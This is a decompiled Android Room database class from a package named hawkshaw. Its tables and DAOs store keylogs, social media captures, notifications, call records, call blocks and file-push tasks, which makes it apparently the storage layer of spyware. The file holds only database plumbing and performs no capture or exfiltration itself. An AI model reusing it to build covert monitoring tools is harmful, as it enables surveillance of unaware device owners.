package com.hawkshaw.library.datalayer.room;

import H2.w;
import V.b;
import V.e;
import W.g;
import Y1.K;
import android.content.Context;
import androidx.room.C;
import androidx.room.C0277h;
import androidx.room.q;
import com.hawkshaw.library.datalayer.room.files.PushFileTaskDao;
import com.hawkshaw.library.datalayer.room.files.PushFileTaskDao_Impl;
import com.hawkshaw.library.datalayer.room.keylogger.KeyLoggerDao;
import com.hawkshaw.library.datalayer.room.keylogger.KeyLoggerDao_Impl;
import com.hawkshaw.library.datalayer.room.logger.LoggerDao;
import com.hawkshaw.library.datalayer.room.logger.LoggerDao_Impl;
import com.hawkshaw.library.datalayer.room.notification.NotificationDao;
import com.hawkshaw.library.datalayer.room.notification.NotificationDao_Impl;
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaDao;
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaDao_Impl;
import com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaDao;
import com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaDao_Impl;
import com.hawkshaw.library.datalayer.room.telephony.TelephonyDao;
import com.hawkshaw.library.datalayer.room.telephony.TelephonyDao_Impl;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

public final class AppDatabase_Impl extends AppDatabase {
    private volatile KeyLoggerDao _keyLoggerDao;
    private volatile LoggerDao _loggerDao;
    private volatile NotificationDao _notificationDao;
    private volatile PushFileTaskDao _pushFileTaskDao;
    private volatile SocialMediaDao _socialMediaDao;
    private volatile TelephonyDao _telephonyDao;
    private volatile UnprocessedSocialMediaDao _unprocessedSocialMediaDao;

    public void clearAllTables() {
        super.assertNotMainThread();
        b a5 = ((g) super.getOpenHelper()).a();
        try {
            super.beginTransaction();
            a5.F("DELETE FROM `LogEntity`");
            a5.F("DELETE FROM `KeyLogEntity`");
            a5.F("DELETE FROM `PushFileTaskEntity`");
            a5.F("DELETE FROM `NotificationEntity`");
            a5.F("DELETE FROM `SocialMediaEntity`");
            a5.F("DELETE FROM `UnprocessedSocialMediaEntity`");
            a5.F("DELETE FROM `CallRecordEntity`");
            a5.F("DELETE FROM `CallBlockEntity`");
            super.setTransactionSuccessful();
        } finally {
            super.endTransaction();
            a5.p0("PRAGMA wal_checkpoint(FULL)").close();
            if (!a5.t0()) {
                a5.F("VACUUM");
            }
        }
    }

    public q createInvalidationTracker() {
        return new q(this, new HashMap(0), new HashMap(0), "LogEntity", "KeyLogEntity", "PushFileTaskEntity", "NotificationEntity", "SocialMediaEntity", "UnprocessedSocialMediaEntity", "CallRecordEntity", "CallBlockEntity");
    }

    /* JADX WARNING: type inference failed for: r0v0, types: [E0.k, java.lang.Object] */
    public e createOpenHelper(C0277h hVar) {
        ? obj = new Object();
        obj.f343E = this;
        obj.f342D = 1;
        C c5 = new C(hVar, obj);
        Context context = hVar.f3965a;
        K.n(context, "context");
        ((w) hVar.f3967c).getClass();
        return new g(context, hVar.f3966b, c5, false, false);
    }

    public List<Object> getAutoMigrations(Map<Class<Object>, Object> map) {
        return new ArrayList();
    }

    public Set<Class<Object>> getRequiredAutoMigrationSpecs() {
        return new HashSet();
    }

    public Map<Class<?>, List<Class<?>>> getRequiredTypeConverters() {
        HashMap hashMap = new HashMap();
        hashMap.put(LoggerDao.class, LoggerDao_Impl.getRequiredConverters());
        hashMap.put(PushFileTaskDao.class, PushFileTaskDao_Impl.getRequiredConverters());
        hashMap.put(KeyLoggerDao.class, KeyLoggerDao_Impl.getRequiredConverters());
        hashMap.put(NotificationDao.class, NotificationDao_Impl.getRequiredConverters());
        hashMap.put(SocialMediaDao.class, SocialMediaDao_Impl.getRequiredConverters());
        hashMap.put(UnprocessedSocialMediaDao.class, UnprocessedSocialMediaDao_Impl.getRequiredConverters());
        hashMap.put(TelephonyDao.class, TelephonyDao_Impl.getRequiredConverters());
        return hashMap;
    }

    public KeyLoggerDao keyLoggerDao() {
        KeyLoggerDao keyLoggerDao;
        if (this._keyLoggerDao != null) {
            return this._keyLoggerDao;
        }
        synchronized (this) {
            try {
                if (this._keyLoggerDao == null) {
                    this._keyLoggerDao = new KeyLoggerDao_Impl(this);
                }
                keyLoggerDao = this._keyLoggerDao;
            } catch (Throwable th) {
                throw th;
            }
        }
        return keyLoggerDao;
    }

    public LoggerDao logDao() {
        LoggerDao loggerDao;
        if (this._loggerDao != null) {
            return this._loggerDao;
        }
        synchronized (this) {
            try {
                if (this._loggerDao == null) {
                    this._loggerDao = new LoggerDao_Impl(this);
                }
                loggerDao = this._loggerDao;
            } catch (Throwable th) {
                throw th;
            }
        }
        return loggerDao;
    }

    public NotificationDao notificationDao() {
        NotificationDao notificationDao;
        if (this._notificationDao != null) {
            return this._notificationDao;
        }
        synchronized (this) {
            try {
                if (this._notificationDao == null) {
                    this._notificationDao = new NotificationDao_Impl(this);
                }
                notificationDao = this._notificationDao;
            } catch (Throwable th) {
                throw th;
            }
        }
        return notificationDao;
    }

    public PushFileTaskDao pushFileTaskDao() {
        PushFileTaskDao pushFileTaskDao;
        if (this._pushFileTaskDao != null) {
            return this._pushFileTaskDao;
        }
        synchronized (this) {
            try {
                if (this._pushFileTaskDao == null) {
                    this._pushFileTaskDao = new PushFileTaskDao_Impl(this);
                }
                pushFileTaskDao = this._pushFileTaskDao;
            } catch (Throwable th) {
                throw th;
            }
        }
        return pushFileTaskDao;
    }

    public SocialMediaDao socialMediaDao() {
        SocialMediaDao socialMediaDao;
        if (this._socialMediaDao != null) {
            return this._socialMediaDao;
        }
        synchronized (this) {
            try {
                if (this._socialMediaDao == null) {
                    this._socialMediaDao = new SocialMediaDao_Impl(this);
                }
                socialMediaDao = this._socialMediaDao;
            } catch (Throwable th) {
                throw th;
            }
        }
        return socialMediaDao;
    }

    public TelephonyDao telephonyDao() {
        TelephonyDao telephonyDao;
        if (this._telephonyDao != null) {
            return this._telephonyDao;
        }
        synchronized (this) {
            try {
                if (this._telephonyDao == null) {
                    this._telephonyDao = new TelephonyDao_Impl(this);
                }
                telephonyDao = this._telephonyDao;
            } catch (Throwable th) {
                throw th;
            }
        }
        return telephonyDao;
    }

    public UnprocessedSocialMediaDao unprocessedSocialMediaDao() {
        UnprocessedSocialMediaDao unprocessedSocialMediaDao;
        if (this._unprocessedSocialMediaDao != null) {
            return this._unprocessedSocialMediaDao;
        }
        synchronized (this) {
            try {
                if (this._unprocessedSocialMediaDao == null) {
                    this._unprocessedSocialMediaDao = new UnprocessedSocialMediaDao_Impl(this);
                }
                unprocessedSocialMediaDao = this._unprocessedSocialMediaDao;
            } catch (Throwable th) {
                throw th;
            }
        }
        return unprocessedSocialMediaDao;
    }
}
